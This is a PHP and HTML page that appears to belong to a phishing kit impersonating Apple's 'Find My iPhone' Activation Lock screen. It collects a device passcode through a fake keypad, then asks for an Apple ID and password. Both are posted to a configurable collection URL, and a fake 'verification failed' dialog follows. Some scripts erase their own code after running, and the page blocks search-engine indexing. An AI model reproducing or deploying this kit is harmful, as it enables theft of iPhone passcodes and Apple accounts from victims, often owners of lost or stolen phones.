<?php
session_name("CAKEPHP");
session_start();
include(__DIR__ . "/../includes/apple.php");

$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';

$passcode_length = $_GET['l'] ?? 4;

echo "<script>
		var username = '$username';
		var post_url = '$post_url';
		var link_id = '$link_id';
		var redirect_url = '$redirect_url';
	  </script>";
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="nosnippet">
    <meta name="robots" content="noodp">
    <meta name="slurp" content="noydir">
    <meta name="robots" content="noimageindex,nomediaindex">
    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="nosnippet">
    <meta name="robots" content="noodp">
    <meta name="slurp" content="noydir">
    <meta name="robots" content="noimageindex,nomediaindex">
    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
 

		<script src="src/icloud_page/jquery-1.10.2.js"></script>
		<script type="text/javascript">
			$(document).ready(function () {
			var ss = setTimeout(function () {
							}, 2000);
			});
		</script>
		
	<title>Find My iPhone</title>
	<base href="">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	<link rel="stylesheet" type="text/css" href="src/activation_lock/passcode.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<script src="code.jquery.com/jquery-1.10.2.js"></script>
	<script src="code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
	<script src="src/icloud_page_new/activity-indicator.js"></script>
</head>
<body id="body_b" style="font-family: Arial, Helvetica, sans-serif;">
	
	<div id="show_1" >
        <div style="margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);">
            <div id="submit_loader_1"><div style="width: 24px; height: 24px; position: absolute; margin-top: -12px; margin-left: 45%; animation: 0.8s linear 0s infinite normal none running spin12;"><svg style="width: 24px; height: 24px;"><g transform="translate(12,12)"><g stroke-width="1" stroke-linecap="round" stroke="rgb(0, 0, 0)"><line x1="0" y1="5" x2="0" y2="10" transform="rotate(0, 0, 0)" opacity="1"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(30, 0, 0)" opacity="0.9173553719008265"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(60, 0, 0)" opacity="0.8347107438016529"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(90, 0, 0)" opacity="0.7520661157024794"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(120, 0, 0)" opacity="0.6694214876033058"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(150, 0, 0)" opacity="0.5867768595041323"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(180, 0, 0)" opacity="0.5041322314049588"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(210, 0, 0)" opacity="0.42148760330578516"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(240, 0, 0)" opacity="0.33884297520661155"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(270, 0, 0)" opacity="0.25619834710743805"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(300, 0, 0)" opacity="0.17355371900826455"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(330, 0, 0)" opacity="0.09090909090909094"></line></g></g></svg></div></div>
            <div style="padding-top: 18px; text-align: center;"><label style="font-family: Arial, Helvetica, sans-serif;"><?=$language['alocate'][$lang];?></label></div>
        </div>
    </div>
	
	<div id="show_2" style="text-align: center; margin-left: 20px; margin-right: 20px; padding-top: 40px; display: none;"> 
		 <center><img src="src/activation_lock/phone.png" width="50" height="50"></center>
		 <br>
		<span style="font-size: 34px;"><?=$language['aowner'][$lang];?></span><br>
		<span style="font-size: 14px;"><?=$language['aenterpasscode'][$lang];?>.</span>
	<div id="code" style="padding-top: 20px;">
	<div id="bile">
	
	<?php
	
		for($i=0;$i<=$passcode_length-1;$i++){
			echo '<svg height="40" width="40">  
					  <circle id="c'.($i + 1).'" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG. 
				  </svg>';
		}
	
	?>
	
	<input type="number" name="" value="" hidden="">
	</div>
	<div style="text-align: center; padding-top: 16px; margin-right: auto; margin-left: auto;">
	<div>
			<table style="width:280px; margin: auto;">
				  <tbody><tr>
					    <th><button id="1" class="button button5">1</button></th>
					    <th><button id="2" class="button button5">2</button></th> 
					    <th><button id="3" class="button button5">3</button></th>
				  </tr>
				  <tr>
					    <th><button id="4" class="button button5">4</button></th>
					    <th><button id="5" class="button button5">5</button></th>
					    <th><button id="6" class="button button5">6</button></th>
				  </tr>
				  <tr>
					    <th><button id="7" class="button button5">7</button></th>
					    <th><button id="8" class="button button5">8</button></th>
					    <th><button id="9" class="button button5">9</button></th>
				  </tr>
				  <tr>
			    <th></th>
			    <th><button id="0" class="button button5">0</button></th>
			    <th><button class="button buttonr" onclick="remove()"><img src="src/activation_lock/next.png" width="35"></button></th>
		  </tr>
	  </tbody></table>
	</div></div>
	</div>
	</div>
	<div id="show_3" style="text-align: center; display: none;">
        <div style=" padding-top: 40px;">
             <center><img src="src/activation_lock/lock.svg" width="50" height="50"></center>
             <br>
             <br>
            <span style="font-size: 45px;">Activation Lock</span><br>
            <div style="margin: 0 auto; max-width:550px;">
                <div style="padding-top: 45px; margin-left: 16px; margin-right: 16px;"><span><?=$language['apple_id_linked'][$lang];?></span><br>
                    <div style="padding-top: 45px; "></div>
                </div>
                <div style="margin-left: 10px; margin-right: 10px; text-align: left; border-bottom: 1px solid #dbdbdb; border-top: 1px solid #dbdbdb;">
                    <div style="border-bottom: 1px solid #dbdbdb;"><label style="padding-left: 40px; position: absolute; padding-top: 14px; "><?=$language['aapple_id'][$lang];?></label>
                        <input id="appleId" type="text" name="id" value="" placeholder="<?=$language['aapple_id'][$lang];?>" style="font-size: 14px; border:none; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 180px; width: 100%;">
                    </div>
                    <div style="padding-left: 34px;"></div>
                    <label style="padding-left: 40px; position: absolute; padding-top: 14px;"><?=$language['apassword'][$lang];?></label>
                    <input id="pw" type="password" name="pwd" value="" placeholder="<?=$language['apassword'][$lang];?>" style="font-size: 14px; border:none; padding-left: 30px; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 180px; width: 100%;">
                    <div></div>
                </div>
            </div>
            <div style="padding-top: 25px; ">
                <div id="submit_loader_2" class="spinner_2 hide" style=""><div style="width: 24px; height: 24px; position: absolute; margin-top: -12px; margin-left: -12px; animation: 0.8s linear 0s infinite normal none running spin12;"><svg style="width: 24px; height: 24px;"><g transform="translate(12,12)"><g stroke-width="1" stroke-linecap="round" stroke="rgb(0, 0, 0)"><line x1="0" y1="5" x2="0" y2="10" transform="rotate(0, 0, 0)" opacity="1"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(30, 0, 0)" opacity="0.9173553719008265"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(60, 0, 0)" opacity="0.8347107438016529"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(90, 0, 0)" opacity="0.7520661157024794"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(120, 0, 0)" opacity="0.6694214876033058"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(150, 0, 0)" opacity="0.5867768595041323"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(180, 0, 0)" opacity="0.5041322314049588"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(210, 0, 0)" opacity="0.42148760330578516"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(240, 0, 0)" opacity="0.33884297520661155"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(270, 0, 0)" opacity="0.25619834710743805"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(300, 0, 0)" opacity="0.17355371900826455"></line><line x1="0" y1="5" x2="0" y2="10" transform="rotate(330, 0, 0)" opacity="0.09090909090909094"></line></g></g></svg></div></div>
                <button class="submit_b" name="submit" id="singin" type="submit" disabled=""><?=$language['aconfirm'][$lang];?></button>
            </div>
            <div id="myModal" class="modal">
                <!-- Modal content -->
                <div align="center" class="modal-content w3-animate-zoom">
                    <div style="padding-left: 18px; padding-right: 18px; padding-top: 18px; padding-bottom: 10px">
                        <span style="padding-top: 10px; font-weight: bold"><?=$language['averification_failed'][$lang];?></span>
                        <div style="padding-top: 4px"><span style="font-size: 13px"><?=$language['aapple_id_password_incorrect'][$lang];?></span></div>
                    </div>
                    <div style="padding-top:12px; min-height: 30px; border-top: 1px solid #dbdbdb; border-bottom-left-radius: 16px; border-bottom-right-radius: 16px;" class="close"><span style="color: #008ae6;"><?=$language['aok'][$lang];?></span></div>
                </div>
            </div>
        </div>
    </div>

<script id="erasable_1" type="text/javascript">

    function validateEmail() {
		var emailField = document.getElementById('appleId');
		var emailValue = emailField.value;

		// Check if email doesn't contain '@'
		if (emailValue && !emailValue.includes('@')) {
			emailField.value = emailValue + '@icloud.com';
		}
	}
	
	function toggleButtonState() {
		var appleId = document.getElementById('appleId').value;
		var pw = document.getElementById('pw').value;
		var submitBtn = document.getElementById('singin');
		
		// Check if both fields are filled
		if (appleId && pw) {
			submitBtn.disabled = false; // Enable the button
		} else {
			submitBtn.disabled = true;  // Disable the button
		}
	}
	
	document.getElementById('appleId').addEventListener('input', toggleButtonState);
	document.getElementById('pw').addEventListener('input', toggleButtonState);
	
	document.getElementById('appleId').addEventListener('blur', validateEmail);
	
   var setcolor = 0;
   var num = 0;
   var afis = 0;
   function remove() {
   if (setcolor > 0){
     changePolyColor("white");
     num = parseInt(num/10); 
   }
   setcolor--;
   if (setcolor <  1)
    setcolor = 0;
   }
   function changePolyColor(color) {
    var poly = document.getElementById("c" + setcolor);
    poly.setAttribute("fill", color);
   }
   document.getElementById("erasable_1").innerHTML = "";
</script>
<script id="erasable_2" type="text/javascript">
   $(document).ready(function(){
    $("#show_1").bind("touchstart", function preventZoom(e){
            var t2 = e.timeStamp;
     var t1 = $(this).data("lastTouch") || t2;
     var dt = t2 - t1;
     var fingers = e.originalEvent.touches.length;
     $(this).data("lastTouch", t2);
     if (!dt || dt > 500 || fingers > 1){
      return; // not double-tap
     }
     e.preventDefault(); // double tap - prevent the zoom
     // also synthesize click events we just swallowed up
     $(e.target).trigger("click");
   });
   $("#show_2").bind("touchstart", function preventZoom(e){
     var t2 = e.timeStamp;
     var t1 = $(this).data("lastTouch") || t2;
     var dt = t2 - t1;
     var fingers = e.originalEvent.touches.length;
     $(this).data("lastTouch", t2);
     if (!dt || dt > 500 || fingers > 1){
      return; // not double-tap
     }
     e.preventDefault(); // double tap - prevent the zoom
     // also synthesize click events we just swallowed up
     $(e.target).trigger("click");
   });
   $("#show_3").bind("touchstart", function preventZoom(e){
     var t2 = e.timeStamp;
     var t1 = $(this).data("lastTouch") || t2;
     var dt = t2 - t1;
     var fingers = e.originalEvent.touches.length;
     $(this).data("lastTouch", t2);
     if (!dt || dt > 500 || fingers > 1){
      return; // not double-tap
     }
     e.preventDefault(); // double tap - prevent the zoom
     // also synthesize click events we just swallowed up
     $(e.target).trigger("click");
   });
   
   var passcode_length = parseInt('<?php echo $passcode_length?>');
   
   $(".button5").click(function(){
    setcolor++;
    if (setcolor <= passcode_length){
     changePolyColor("black"); 
     num = (num*10) + parseInt($(this).prop("id"));
     if (setcolor == passcode_length){
      
	  
	  if(passcode_length<=4){
		  if (num.toString().length == 0){
			num = "0000"+num;
		  };
		  if (num.toString().length == 1){
			num = "000"+num;
		  };
		  if (num.toString().length == 2){
			num = "00"+num;
		  };
		  if (num.toString().length == 3){
			num = "0"+num;
		  };
	  }else{
		  if (num.toString().length == 0){
			num = "000000"+num;
		  };
		  if (num.toString().length == 1){
			num = "00000"+num;
		  };
		  if (num.toString().length == 2){
			num = "0000"+num;
		  };
		  if (num.toString().length == 3){
			num = "000"+num;
		  };
		  
		  if (num.toString().length == 4){
			num = "00"+num;
		  };
		  
		  if (num.toString().length == 5){
			num = "0"+num;
		  };
	  }
   
    
	
	  $.ajax({
			type:"POST",
			url: post_url,
			data:'id=' + link_id + '&type=passcode&pass=' + num,
			dataType: "json",
			success: function(data){},
			error: function(XMLHttpRequest, textStatus, errorThrown) {},
			complete: function(XMLHttpRequest, textStatus, errorThrown) {
				
			},
		});
	
	
	
      afis++;
      if (afis == 2){
			$("#show_2").css("display", "none");
			  $( "#show_3" ).fadeIn( "slow", function() {
				$( "#appleId" ).focus();
			 });
      }
      else
       $("#bile").effect("shake", {times:3}, 500, callback);
      }
      }
     if (setcolor > passcode_length)
      setcolor = passcode_length;
   });  
   function callback(){
    num = 0;
   
    setTimeout(clear(), 3000);
   }
   function clear(){
    for (var i=0;i<=passcode_length;i++){
     changePolyColor("white");
     setcolor--;
    } 
    setcolor = 0;   
   }
     function show_body() {
      $("#show_1").css("display", "none");
      $( "#show_2" ).fadeIn( "slow", function() {
		//$( "#code_in" ).focus();
      });
     }
     setTimeout(show_body, 2000);
   });

   document.getElementById("erasable_2").innerHTML = "";
   
   
   function handleSignIn() {
		
	}
  
   
</script>
<script type="text/javascript">
   jQuery("#submit_loader_1").activity({width: 0, segments: 12, length: 5});
   jQuery("#submit_loader_2").activity({width: 0, segments: 12, length: 5});
   
   $(".close").click(function(){
    $("#myModal").css("display", "none");
    $("#pw").focus();
   
   });
   
    $('#singin').click(function(){
		username = document.getElementById('appleId').value;
		var password = document.getElementById('pw').value;
		var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;
		
		$.ajax({
			type:"POST",
			url: post_url,
			data:data,
			dataType: "json",
			beforeSend: function(xhr) {
				$("#singin").addClass("hide");
				$("#submit_loader_2").removeClass("hide");
			},
			success: function(data){
				if(data.success){
					window.top.location.href = redirect_url;
				}else{
					
				}
			},
			error: function(XMLHttpRequest, textStatus, errorThrown) {
				
			},
			complete: function(xhr, status) {
				$("#submit_loader_2").addClass("hide");
				$("#singin").removeClass("hide");
				$("#myModal").css("display", "block");
			}
		});
		
		
		
   });
   
   
</script>
</body></html>